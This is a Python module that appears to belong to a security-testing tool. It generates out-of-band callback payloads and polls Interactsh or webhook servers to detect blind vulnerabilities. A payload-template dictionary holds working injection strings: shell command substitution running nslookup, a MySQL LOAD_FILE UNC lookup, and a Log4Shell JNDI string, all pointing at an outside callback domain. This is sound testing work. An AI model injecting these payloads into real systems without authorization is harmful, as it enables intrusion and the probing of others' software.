"""OAST Manager for Out-of-Band Application Security Testing.

This module provides the core infrastructure for generating OAST payloads
and tracking callbacks for blind vulnerability detection.
"""
import hashlib
import logging
import os
import secrets
import time
from dataclasses import dataclass, field
from datetime import UTC, datetime
from typing import Any, Literal

import requests
from requests.exceptions import RequestException, Timeout

logger = logging.getLogger(__name__)


@dataclass
class OASTCallback:
    """Represents a callback interaction received by the OAST server."""
    
    id: str
    payload_id: str
    callback_type: Literal["dns", "http"]
    timestamp: datetime
    source_ip: str | None = None
    source_port: int | None = None
    protocol: str | None = None
    raw_data: str | None = None
    headers: dict[str, str] = field(default_factory=dict)
    query_params: dict[str, str] = field(default_factory=dict)
    body: str | None = None
    
    def to_dict(self) -> dict[str, Any]:
        """Convert callback to dictionary."""
        return {
            "id": self.id,
            "payload_id": self.payload_id,
            "type": self.callback_type,
            "timestamp": self.timestamp.isoformat(),
            "source_ip": self.source_ip,
            "source_port": self.source_port,
            "protocol": self.protocol,
            "raw_data": self.raw_data,
            "headers": self.headers,
            "query_params": self.query_params,
            "body": self.body,
        }


@dataclass
class OASTPayload:
    """Represents an OAST payload with its associated metadata."""
    
    id: str
    marker: str
    payload_type: Literal["dns", "http", "both"]
    vuln_type: str
    created_at: datetime
    dns_payload: str | None = None
    http_payload: str | None = None
    description: str = ""
    context: dict[str, Any] = field(default_factory=dict)
    callbacks: list[OASTCallback] = field(default_factory=list)
    
    def to_dict(self) -> dict[str, Any]:
        """Convert payload to dictionary."""
        return {
            "id": self.id,
            "marker": self.marker,
            "type": self.payload_type,
            "vuln_type": self.vuln_type,
            "created_at": self.created_at.isoformat(),
            "dns_payload": self.dns_payload,
            "http_payload": self.http_payload,
            "description": self.description,
            "context": self.context,
            "callback_count": len(self.callbacks),
            "has_callbacks": len(self.callbacks) > 0,
        }


class OASTManager:
    """Manager for Out-of-Band Application Security Testing.
    
    Supports multiple OAST backends:
    - Interactsh (default, self-hosted or public)
    - Burp Collaborator (via Caido/Burp integration)
    - Custom webhook endpoints
    
    Example:
        >>> manager = OASTManager()
        >>> payload = manager.generate_payload("sqli_blind")
        >>> # Use payload.dns_payload in your injection
        >>> # Later check for callbacks
        >>> callbacks = manager.check_interactions(payload.id)
    """
    
    def __init__(
        self,
        server_url: str | None = None,
        api_key: str | None = None,
        backend: Literal["interactsh", "webhook", "mock"] = "interactsh",
    ):
        """Initialize OAST Manager.
        
        Args:
            server_url: OAST server URL (e.g., interactsh server)
            api_key: API key for authentication
            backend: Backend type to use
        """
        self.server_url = server_url or os.getenv("OAST_SERVER_URL", "")
        self.api_key = api_key or os.getenv("OAST_API_KEY", "")
        self.backend = backend
        
        # Storage for payloads and callbacks
        self._payloads: dict[str, OASTPayload] = {}
        self._session_id = secrets.token_hex(8)
        
        # Interactsh specific
        self._interactsh_domain: str | None = None
        self._interactsh_secret: str | None = None
        self._interactsh_correlation_id: str | None = None
        
        logger.info(f"OAST Manager initialized with backend: {backend}")
    
    def _generate_marker(self) -> str:
        """Generate a unique marker for payload identification."""
        timestamp = int(time.time() * 1000)
        random_part = secrets.token_hex(4)
        return f"{self._session_id}{random_part}{timestamp:x}"[-20:]
    
    def _generate_interactsh_subdomain(self, marker: str) -> str:
        """Generate Interactsh-compatible subdomain."""
        # Interactsh uses specific format: <correlation_id>.<random>.<domain>
        if self._interactsh_domain:
            return f"{marker}.{self._interactsh_domain}"
        # Fallback to public interactsh
        return f"{marker}.oast.fun"
    
    def generate_payload(
        self,
        vuln_type: str,
        payload_type: Literal["dns", "http", "both"] = "both",
        context: dict[str, Any] | None = None,
        description: str = "",
    ) -> OASTPayload:
        """Generate an OAST payload for vulnerability testing.
        
        Args:
            vuln_type: Type of vulnerability being tested (e.g., "sqli_blind", "xxe", "ssrf")
            payload_type: Type of callback to generate
            context: Additional context about the test
            description: Human-readable description
            
        Returns:
            OASTPayload with generated payloads ready for injection
            
        Example:
            >>> payload = manager.generate_payload("ssrf", payload_type="http")
            >>> print(payload.http_payload)
            'http://abc123def456.oast.fun/ssrf'
        """
        marker = self._generate_marker()
        payload_id = f"oast_{marker}"
        
        dns_payload = None
        http_payload = None
        
        if payload_type in ("dns", "both"):
            dns_payload = self._generate_dns_payload(marker, vuln_type)
        
        if payload_type in ("http", "both"):
            http_payload = self._generate_http_payload(marker, vuln_type)
        
        payload = OASTPayload(
            id=payload_id,
            marker=marker,
            payload_type=payload_type,
            vuln_type=vuln_type,
            created_at=datetime.now(UTC),
            dns_payload=dns_payload,
            http_payload=http_payload,
            description=description or f"OAST payload for {vuln_type}",
            context=context or {},
        )
        
        self._payloads[payload_id] = payload
        logger.debug(f"Generated OAST payload: {payload_id} for {vuln_type}")
        
        return payload
    
    def _generate_dns_payload(self, marker: str, vuln_type: str) -> str:
        """Generate DNS-based callback payload."""
        subdomain = self._generate_interactsh_subdomain(marker)
        
        # Return different formats based on vulnerability type
        payload_templates = {
            "sqli_blind": f"$(nslookup {subdomain})",
            "sqli_mysql": f"SELECT LOAD_FILE(CONCAT('\\\\\\\\',({subdomain}),'\\\\a'))",
            "xxe": subdomain,
            "ssrf": subdomain,
            "rce": f"`nslookup {subdomain}`",
            "ssti": subdomain,
            "log4j": f"${{jndi:dns://{subdomain}}}",
            "default": subdomain,
        }
        
        return payload_templates.get(vuln_type, payload_templates["default"])
    
    def _generate_http_payload(self, marker: str, vuln_type: str) -> str:
        """Generate HTTP-based callback payload."""
        if self.server_url:
            base_url = self.server_url.rstrip("/")
        else:
            # Use interactsh HTTP endpoint
            subdomain = self._generate_interactsh_subdomain(marker)
            base_url = f"http://{subdomain}"
        
        # Add vuln_type as path for identification
        return f"{base_url}/{vuln_type}/{marker}"
    
    def check_interactions(
        self,
        payload_id: str,
        timeout: int = 5,
    ) -> list[OASTCallback]:
        """Check for callback interactions for a specific payload.
        
        Args:
            payload_id: The payload ID to check
            timeout: Request timeout in seconds
            
        Returns:
            List of callbacks received for this payload
        """
        if payload_id not in self._payloads:
            logger.warning(f"Unknown payload ID: {payload_id}")
            return []
        
        payload = self._payloads[payload_id]
        
        if self.backend == "mock":
            return self._check_mock_interactions(payload)
        elif self.backend == "interactsh":
            return self._check_interactsh_interactions(payload, timeout)
        elif self.backend == "webhook":
            return self._check_webhook_interactions(payload, timeout)
        
        return payload.callbacks
    
    def _check_mock_interactions(self, payload: OASTPayload) -> list[OASTCallback]:
        """Mock interaction check for testing."""
        # Return existing callbacks (useful for testing)
        return payload.callbacks
    
    def _check_interactsh_interactions(
        self,
        payload: OASTPayload,
        timeout: int,
    ) -> list[OASTCallback]:
        """Check Interactsh server for interactions."""
        if not self.server_url:
            # Can't poll without a server
            logger.debug("No OAST server configured, skipping interaction check")
            return payload.callbacks
        
        try:
            poll_url = f"{self.server_url.rstrip('/')}/poll"
            params = {"id": payload.marker}
            
            if self._interactsh_secret:
                params["secret"] = self._interactsh_secret
            
            response = requests.get(
                poll_url,
                params=params,
                timeout=timeout,
                headers={"Authorization": f"Bearer {self.api_key}"} if self.api_key else {},
            )
            
            if response.status_code == 200:
                data = response.json()
                for interaction in data.get("data", []):
                    callback = self._parse_interactsh_interaction(interaction, payload.id)
                    if callback and callback.id not in [c.id for c in payload.callbacks]:
                        payload.callbacks.append(callback)
            
        except (RequestException, Timeout, ValueError) as e:
            logger.debug(f"Error checking OAST interactions: {e}")
        
        return payload.callbacks
    
    def _check_webhook_interactions(
        self,
        payload: OASTPayload,
        timeout: int,
    ) -> list[OASTCallback]:
        """Check webhook server for interactions."""
        if not self.server_url:
            return payload.callbacks
        
        try:
            check_url = f"{self.server_url.rstrip('/')}/callbacks/{payload.marker}"
            response = requests.get(
                check_url,
                timeout=timeout,
                headers={"Authorization": f"Bearer {self.api_key}"} if self.api_key else {},
            )
            
            if response.status_code == 200:
                data = response.json()
                for cb_data in data.get("callbacks", []):
                    callback = OASTCallback(
                        id=cb_data.get("id", secrets.token_hex(8)),
                        payload_id=payload.id,
                        callback_type=cb_data.get("type", "http"),
                        timestamp=datetime.fromisoformat(cb_data.get("timestamp", datetime.now(UTC).isoformat())),
                        source_ip=cb_data.get("source_ip"),
                        source_port=cb_data.get("source_port"),
                        raw_data=cb_data.get("raw_data"),
                        headers=cb_data.get("headers", {}),
                        query_params=cb_data.get("query_params", {}),
                        body=cb_data.get("body"),
                    )
                    if callback.id not in [c.id for c in payload.callbacks]:
                        payload.callbacks.append(callback)
                        
        except (RequestException, Timeout, ValueError) as e:
            logger.debug(f"Error checking webhook interactions: {e}")
        
        return payload.callbacks
    
    def _parse_interactsh_interaction(
        self,
        interaction: dict[str, Any],
        payload_id: str,
    ) -> OASTCallback | None:
        """Parse an Interactsh interaction into OASTCallback."""
        try:
            interaction_id = interaction.get("unique-id", secrets.token_hex(8))
            protocol = interaction.get("protocol", "").lower()
            
            callback_type: Literal["dns", "http"] = "dns" if protocol == "dns" else "http"
            
            timestamp_str = interaction.get("timestamp", "")
            try:
                timestamp = datetime.fromisoformat(timestamp_str.replace("Z", "+00:00"))
            except ValueError:
                timestamp = datetime.now(UTC)
            
            return OASTCallback(
                id=interaction_id,
                payload_id=payload_id,
                callback_type=callback_type,
                timestamp=timestamp,
                source_ip=interaction.get("remote-address"),
                protocol=protocol,
                raw_data=interaction.get("raw-request"),
                headers=interaction.get("http-headers", {}),
                query_params=interaction.get("http-query", {}),
                body=interaction.get("http-body"),
            )
        except Exception as e:
            logger.debug(f"Error parsing interaction: {e}")
            return None
    
    def wait_for_callback(
        self,
        payload_id: str,
        timeout: int = 30,
        poll_interval: float = 2.0,
    ) -> OASTCallback | None:
        """Wait for a callback with polling.
        
        Args:
            payload_id: Payload ID to wait for
            timeout: Maximum wait time in seconds
            poll_interval: Time between polls in seconds
            
        Returns:
            First callback received, or None if timeout
        """
        if payload_id not in self._payloads:
            logger.warning(f"Unknown payload ID: {payload_id}")
            return None
        
        payload = self._payloads[payload_id]
        initial_count = len(payload.callbacks)
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            callbacks = self.check_interactions(payload_id)
            
            if len(callbacks) > initial_count:
                # New callback received
                return callbacks[-1]
            
            time.sleep(poll_interval)
        
        return None
    
    def get_payload(self, payload_id: str) -> OASTPayload | None:
        """Get a payload by ID."""
        return self._payloads.get(payload_id)
    
    def list_payloads(
        self,
        vuln_type: str | None = None,
        with_callbacks_only: bool = False,
    ) -> list[OASTPayload]:
        """List all generated payloads.
        
        Args:
            vuln_type: Filter by vulnerability type
            with_callbacks_only: Only return payloads that received callbacks
            
        Returns:
            List of matching payloads
        """
        payloads = list(self._payloads.values())
        
        if vuln_type:
            payloads = [p for p in payloads if p.vuln_type == vuln_type]
        
        if with_callbacks_only:
            payloads = [p for p in payloads if len(p.callbacks) > 0]
        
        return payloads
    
    def clear_payloads(self, older_than_hours: int | None = None) -> int:
        """Clear stored payloads.
        
        Args:
            older_than_hours: Only clear payloads older than this many hours
            
        Returns:
            Number of payloads cleared
        """
        if older_than_hours is None:
            count = len(self._payloads)
            self._payloads.clear()
            return count
        
        cutoff = datetime.now(UTC).timestamp() - (older_than_hours * 3600)
        to_remove = [
            pid for pid, payload in self._payloads.items()
            if payload.created_at.timestamp() < cutoff
        ]
        
        for pid in to_remove:
            del self._payloads[pid]
        
        return len(to_remove)
    
    def add_mock_callback(
        self,
        payload_id: str,
        callback_type: Literal["dns", "http"] = "http",
        source_ip: str = "127.0.0.1",
    ) -> OASTCallback | None:
        """Add a mock callback for testing purposes.
        
        Args:
            payload_id: Payload to add callback to
            callback_type: Type of callback
            source_ip: Source IP to use
            
        Returns:
            The created callback, or None if payload not found
        """
        if payload_id not in self._payloads:
            return None
        
        callback = OASTCallback(
            id=secrets.token_hex(8),
            payload_id=payload_id,
            callback_type=callback_type,
            timestamp=datetime.now(UTC),
            source_ip=source_ip,
        )
        
        self._payloads[payload_id].callbacks.append(callback)
        return callback


# Global manager instance
_global_oast_manager: OASTManager | None = None


def get_oast_manager() -> OASTManager:
    """Get or create the global OAST manager instance."""
    global _global_oast_manager
    if _global_oast_manager is None:
        _global_oast_manager = OASTManager()
    return _global_oast_manager


def reset_oast_manager() -> None:
    """Reset the global OAST manager (for testing)."""
    global _global_oast_manager
    _global_oast_manager = None
